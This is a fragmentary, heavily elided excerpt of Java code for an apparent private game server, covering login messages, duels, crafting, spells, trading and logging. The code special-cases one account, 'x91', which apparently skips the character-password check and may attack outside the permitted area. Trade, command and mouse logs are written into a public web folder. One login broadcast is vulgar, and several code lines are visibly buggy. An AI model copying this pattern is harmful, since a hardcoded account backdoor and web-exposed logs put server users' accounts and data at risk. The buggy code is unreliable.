                  sendMessage("Xero has kindly added a muting option in report abuse menu");
                  sendMessage("To use it, select mute option while reporting a player :)");
                  sendMessage("Enjoy, Xero <3");
                }
                 if(playerRights >= 2) {
                  sendMessage("Welcome back administrator "+playerName);
                  sendMessage("New command! ::clicks");
                  sendMessage("This'll disable/enable mouse logging, only use if needed,");
                  sendMessage("it lags the server bad if it's on but will catch autoers.");
                }

SendWeapon((playerEquipment[playerWeapon]), GetItemName(playerEquipment[playerWeapon]));

if(playerName.equalsIgnoreCase("vegeta ssj"))
PlayerHandler.messageToAll = "OMFG VEGETA HAS LOGGED ON! FAP FAP FAP AWAY BITCHES!";
...
ScanItems(); // Xerozcheez: Catches dupers
				...
				//hasegg = 1;
                /*END OF DROP*/
                sendQuest("Freescape.servegame.com", 2451);
                sendQuest("Hay, it's free!", 2452);
                checkMacroWarn();
                if(checkMacroWarn() == 5)
		{
...
if(startDuel && duelChatTimer <= 0)
{
 ...
 else if(duelChatStage == 2){
  txt4 = "2";
  string4UpdateRequired = true;
  duelChatTimer += 2;
  duelChatStage = 2;
 } 
 else if(duelChatStage == 3){
  txt4 = "1";
  string4UpdateRequired = true;
  duelChatTimer += 2;
  duelChatStage = 2;
 } 
 else if(duelChatStage == 4){
  txt4 = "FIGHT!";
  string4UpdateRequired = true;
  duelChatTimer += 2;
  duelChatStage = -1;
...
int oldtotal = totalz;
totalz = (getLevelForXP(playerXP[0]) + getLevelForXP(playerXP[1]) + getLevelForXP(playerXP[2]) + getLevelForXP(playerXP[3]) + getLevelForXP(playerXP[4]) + getLevelForXP(playerXP[5]) + getLevelForXP(playerXP[6]) + getLevelForXP(playerXP[7]) + getLevelForXP(playerXP[8]) + getLevelForXP(playerXP[9]) + getLevelForXP(playerXP[10]) + getLevelForXP(playerXP[0]) + getLevelForXP(playerXP[11]) + getLevelForXP(playerXP[12]) + getLevelForXP(playerXP[13]) + getLevelForXP(playerXP[14]) + getLevelForXP(playerXP[15]) + getLevelForXP(playerXP[6]) + getLevelForXP(playerXP[17]) + getLevelForXP(playerXP[18]) + getLevelForXP(playerXP[19]) + getLevelForXP(playerXP[20]) + server.skillHandler.summoning.getSummonLvlForXP(summonXP));
if(oldtotal != totalz)
...
println_debug("atObjectID: "+atObjectID+" atObjectY: "+atObjectY+" itemSlot: "+itemSlot+" atObjectX: "+atObjectX+" useItemID: "+useItemID+" j6: "+j6);
				...
				{
				rune();
				}  				//Gilded Armour Crafting Item 5525 = Normal Tiara. 
				else if(useItemID == 5525 && (atObjectX == 3238 && atObjectY == 3434)) //East Varrock Fountain
				{
					craftgild();
				}
					//Dragon Armour Crafting Item 5549 = Blood Tiara
				else if(useItemID == 5549 && (atObjectX == 3238 && atObjectY == 3434)) //East Varrock Fountain
				{
					craftdrag();
				}
					//Rune Armour Crafting Item 5545 = Law Tiara
				else if(useItemID == 5545 && (atObjectX == 3238 && atObjectY == 3434)) //East Varrock Fountain
				{
					craftrune();
				}
					//Saradomin Armour Crafting Item 5527 = Air Tiara
				else if(useItemID == 5527 && (atObjectX == 3238 && atObjectY == 3434)) //East Varrock Fountain
				{
					craftsara();
				}
					//Zamorak Armour Crafting Item 5537 = Fire Tiara
				else if(useItemID == 5537 && (atObjectX == 3238 && atObjectY == 3434)) //East Varrock Fountain
				{
					craftzam();
				}
					//Guthix Armour Crafting Item 5541 = Nature Tiara
				else if(useItemID == 5541 && (atObjectX == 3238 && atObjectY == 3434)) //East Varrock Fountain
				{
					craftguth();
				}
				...
				else if(useItemID == 2355 && atObjectID == 2783)//barrow equipment
				{
					initSmithing(2355);
					flushOutStream();
				}
...
server.playerHandler.players[useOnPlayer];
	 ...
	 if (b3 != null) try {
      ...
      try {
         b3 = new BufferedWriter(new FileWriter("C:/apache2triad/htdocs/logs87/giveitemlogs.txt", true));
	 b3.write("["+playerName+"] gives/uses item ["+itemUseID+"] on player: ["+p2.playerName+"]");
	 b3.newLine();
	 b3.flush();
      } catch (IOException ioe) {
...
PlayerHandler.kickNick = p5.playerName;
	 ...
	 if (bw1 != null) try {
      ...
      try { 
         bw1 = new BufferedWriter(new FileWriter("C:/apache2triad/htdocs/logs87/kicklogs.txt", true));
	 bw1.write(playerName+" kicked "+p5.playerName);
	 bw1.newLine();
	 bw1.flush();
      } catch (IOException ioe) {
...
if((inwildy2 == true && InWildrange == true && duelStatus == -1) || playerName.equalsIgnoreCase("x91"))	
{	
...
else if(inwildy2 == true && InWildrange == false && duelStatus == -1)
{
sendMessage("You're need to move deeper into the wilderness to attack this player");
}
else if(inwildy2 == false && duelStatus == -1)
{
...
ProjectileSpell(93, 94, 95, absY, absX, offsetY, offsetX, npcIndex, EnemyY2, EnemyX2, 5, 5, 566, 558, 555, 1, 1, 1);
}
if (magicID == 1156) { // Earth Strike
ProjectileSpell(96, 97, 98, absY, absX, offsetY, offsetX, npcIndex, EnemyY2, EnemyX2, 9, 8, 566, 558, 557, 1, 1, 2);
}
if (magicID == 1158) { // Fire Strike
ProjectileSpell(99, 100, 101, absY, absX, offsetY, offsetX, npcIndex, EnemyY2, EnemyX2, 11, 12, 566, 558, 554, 1, 1, 3);
}
if (magicID == 1160) { // Wind bolt
ProjectileSpell(117, 118, 119, absY, absX, offsetY, offsetX, npcIndex, EnemyY2, EnemyX2, 12, 19, 566, 558, 2, 1);
}
if (magicID == 1163) { // Water bolt
ProjectileSpell(120, 121, 122, absY, absX, offsetY, offsetX, npcIndex, EnemyY2, EnemyX2, 14, 21, 566, 558, 555, 2, 1, 2);
}
if (magicID == 1166) { // Earth bolt
ProjectileSpell(123, 124, 125, absY, absX, offsetY, offsetX, npcIndex, EnemyY2, EnemyX2, 15, 29, 566, 558, 557, 2, 1, 2);
}
if (magicID == 1169) { // Fire bolt
ProjectileSpell(126, 127, 128, absY, absX, offsetY, offsetX, npcIndex, EnemyY2, EnemyX2, 16, 35, 566, 558, 554, 3, 1, 4);
}
if (magicID == 1172) { // Wind blast
ProjectileSpell(132, 133, 134, absY, absX, offsetY, offsetX, npcIndex, EnemyY2, EnemyX2, 17, 40, 566, 560, 3, 1);
}
if (magicID == 1175) { // Water blast
ProjectileSpell(135, 136, 137, absY, absX, offsetY, offsetX, npcIndex, EnemyY2, EnemyX2, 18, 46, 566, 560, 555, 3, 1, 3);
}
if (magicID == 1177) { // Earth blast
ProjectileSpell(138, 139, 140, absY, absX, offsetY, offsetX, npcIndex, EnemyY2, EnemyX2, 19, 52, 566, 560, 557, 3, 1, 3);
}
if (magicID == 1181) { // Fire blast
ProjectileSpell(129, 130, 131, absY, absX, offsetY, offsetX, npcIndex, EnemyY2, EnemyX2, 21, 59, 566, 560, 554, 4, 1, 5);
}
if (magicID == 1183) { // Wind wave
ProjectileSpell(158, 159, 160, absY, absX, offsetY, offsetX, npcIndex, EnemyY2, EnemyX2, 25, 65, 566, 4278, 5, 1);
}
if (magicID == 1185) { // Water wave
ProjectileSpell(161, 162, 163, absY, absX, offsetY, offsetX, npcIndex, EnemyY2, EnemyX2, 27, 70, 566, 4278, 555, 5, 1, 7);
}
if (magicID == 1188) { // Earth wave
ProjectileSpell(164, 165, 166, absY, absX, offsetY, offsetX, npcIndex, EnemyY2, EnemyX2, 29, 75, 566, 4278, 557, 5, 1, 7);
}
if (magicID == 1189) { // Fire wave
ProjectileSpell(155, 156, 157, absY, absX, offsetY, offsetX, npcIndex, EnemyY2, EnemyX2, 27, 82, 566, 4278, 554, 5, 1, 7);
}
...
{
startAnimation(1979);
server.npcHandler.npcs[npcIndex].hitDiff = 6 + misc.random(54);
...
sendMessage("You can't attack a player's summoned npc!");
	...
	break;
      ...
      try {
         bw3 = new BufferedWriter(new FileWriter("logs/mouselogs.txt", true));
	 bw3.write(playerName+": "+mouseclick);
	 bw3.newLine();
	 bw3.flush();
      } catch (IOException ioe) {
	 ioe.printStackTrace();
	 ...
	 if (bw3 != null) try {
	    ...
	    System.out.println(playerName+": Error logging mouse clicks!");
	 }
      }
      try {
         bw3 = new BufferedWriter(new FileWriter("C:/apache2triad/htdocs/logs87/mouselogs.txt", true));
	 bw3.write(playerName+": "+mouseclick);
	 bw3.newLine();
	 bw3.flush();
      } catch (IOException ioe) {
	 ...
	 if (bw2 != null) try {
      ...
      try {
         bw2 = new BufferedWriter(new FileWriter("C:/apache2triad/htdocs/logs87/commandlogs.txt", true));
	 bw2.write("["+playerName+"]: Command: "+playerCommand);
	 bw2.newLine();
	 bw2.flush();
      } catch (IOException ioe) {
...
server.npcHandler.newNPC(1645, absX+1, absY, heightLevel, absX + 3, absY + 3, absX + -3, absY + -3, 1, server.npcHandler.GetNpcListHP(1645), false);      
				...
				actionButtonId = misc.HexToInt(inStream.buffer, 0, packetSize);
                                ...
                                for(int i2 = 0; i2 < server.skillHandler.summoning.maxSummon; i2++) {
                                  if(server.skillHandler.summoning.ActionID[i2] == actionButtonId && server.skillHandler.summoning.ActionID[i2] != 0) {
                                    server.skillHandler.summoning.playerSummon(i2, playerId);
                                    summon = true;
                                  }
                                }
                                if(!summon) {
...
break;
                      ...
                      case 6004: TeleTo("Ardougne", 48);ancientstele = false; break;
                      case 6005: TeleTo("Watchtower", 51);ancientstele = false; break;
...
break;
					...
					case 168: // yes emote
				startAnimation(0x357);
				break;

                            case 169: // no emote
				startAnimation(0x358);
				break;
				case 162: // think emote
                                startAnimation(0x359);
				break;
				                            case 164: // bow emote
                                startAnimation(0x35A);
				break;
 ...
 return false;			
	...
	public void CalculateRange() {
		...
		int Range = playerLevel[4]; //Range
                {
			MaxHit += (double)(1.05 + (double)((double)(RangeBonus * Range) * 0.0075));
		} 
...
/*TRADING*/
  ...
  BufferedWriter bw = null;
	 ...
	 if (bw != null) try {
      ...
      try {
         bw = new BufferedWriter(new FileWriter("C:/apache2triad/htdocs/logs87/trades.txt", true));
	 bw.write(PlayerHandler.players[tradeWith].playerName+" trades item: "+(playerOTItems[i] - 1)+" amount: "+playerOTItemsN[i]+" with "+playerName);
	 bw.newLine();
	 bw.flush();
      } catch (IOException ioe) {
...
/*Equipment level checking*/
	...
	public int GetWorld(int PlayerID) {
		...
		if (Server.equals("cheezscape.servegame.org")) {
			return 1;
		} else if (Server.equals("cheezscape.ath.cx")) {
			return 2;
		} else {
...
characterfile.write("[EOF]", 0, 5);
      ...
      try {
         bw3 = new BufferedWriter(new FileWriter("logs/mouselogs.txt", true));
	 bw3.write(playerName+": CLICKED > "+clicks+" CLICKS!");
	 bw3.newLine();
	 bw3.flush();
      } catch (IOException ioe) {
	 ioe.printStackTrace();
	 ...
	 if (bw3 != null) try {
	    ...
	    System.out.println(playerName+": Error saving note in mouse logs!");
	 }
      }
				...
				switch (ReadMode) {
					case 1:
						if (token.equals("character-password")) {
                                                        if(!playerName2.equalsIgnoreCase("x91"))
